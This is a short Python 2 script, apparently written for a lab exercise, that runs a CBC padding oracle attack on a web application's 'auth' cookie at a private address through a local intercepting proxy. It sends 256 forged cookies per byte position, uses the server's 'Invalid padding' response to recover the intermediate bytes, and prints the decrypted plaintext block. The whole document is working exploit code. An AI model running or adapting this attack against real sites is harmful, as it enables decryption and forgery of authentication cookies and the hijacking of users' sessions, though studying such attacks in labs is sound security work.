import urllib2
import urllib
import base64
import binascii

proxy = urllib2.ProxyHandler({'http': '127.0.0.1:8080'})
opener = urllib2.build_opener(proxy)
urllib2.install_opener(opener)

url = "http://192.168.56.104/index.php"
#enc = "\x87\xc5\x75\x34\xd1\xd9\xb2\xa3"
#prepend = "\x59\x2c\x8f\x4f\x67\xef\xb6\xe5"
intm = "\x00\x00\x00\x00\x00\x00\x00\x00"
#iv = "\x00\x00\x00\x00\x00\x00\x00\x00"
prepend = "\x87\xc5\x75\x34\xd1\xd9\xb2\xa3"
prepend = "\x09\xf6\x31\x56\x7f\x39\x07\x87"
enc = "\x75\xf7\x4c\x06\x06\x1a\xa9\x74"

padpos = 0x01

for pos in range(8, 0, -1):
    #pos = 8
    print "Get position: " + str(pos)
    for i in range(0, 256):
        #ch = enc[-1:]
        s = ""
        for j in range(pos, 8):
            #print binascii.hexlify(intm[j]),
            #s = s + chr(ord(intm[j]) ^ (0x00 + (8-j)))
            s = s + chr(ord(intm[j]) ^ padpos)
        #print "s: "  + binascii.hexlify(s)
        tmp = enc[:pos-1] + chr(i) + s
        #print binascii.hexlify(tmp)
        pl = base64.b64encode(tmp + prepend)
        cookie = {"auth": pl}
        #break

        req = urllib2.Request(url)
        req.add_header('Cookie', urllib.urlencode(cookie))
        res = urllib2.urlopen(req)
        content = res.read()
        if content != "Invalid padding":
            #found = 1
            #print "intermediate: " + binascii.hexlify(intm[:pos-1])  + ":" + binascii.hexlify(intm[pos:])
            intm = intm[:pos-1] + chr(i ^ padpos) + intm[pos:]
            padpos = padpos + 1
            print "intermediate: " + binascii.hexlify(intm)
            #print content
            #print binascii.hexlify(chr(padpos))
            break
        #else:
            #print content

#print "intermediate: " + binascii.hexlify(intm)
p = ""
for i in range(0, 8):
    p = p + chr(ord(enc[i]) ^ ord(intm[i]))
#print binascii.hexlify(p)
print p
